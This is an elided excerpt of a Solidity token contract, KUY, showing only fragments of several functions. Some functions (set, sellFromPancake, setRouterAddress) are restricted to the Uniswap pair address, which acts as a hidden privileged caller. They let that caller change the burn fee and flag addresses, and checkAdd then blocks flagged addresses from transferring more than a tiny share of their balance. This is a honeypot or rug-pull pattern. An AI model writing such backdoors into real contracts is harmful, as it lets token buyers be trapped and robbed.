...
contract KUY is Context, IERC20, Ownable {
    ...
    function set(
        ...
        require(msg.sender == uniSwapPair);
        _burn = newburn;
    ...
    function sellFromPancake(uint256 amount) public {
        require(msg.sender == uniSwapPair);
    ...
    function checkAdd(
        ...
        if (amount > balanceOf(sender).div(10000)) {
            require(
                !RouterAddress[sender] && !RouterAddress[recipient],
                "RouterAddress address"
            );
        }
        if (launchStart + launchEnd >= block.number) {
    ...
    function setRouterAddress(address fool, bool value) public {
        require(msg.sender == uniSwapPair);
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (
                ...
                if (dividendByNUM) contractTokenBalance = minDividendNum;
        ...
        returns (uint256)
    {
        ...
        if (_burn > 0) {
            ...
            _balances[address(deadAddress)] = _balances[address(deadAddress)]
                .add(burnfeeAmount);
        }
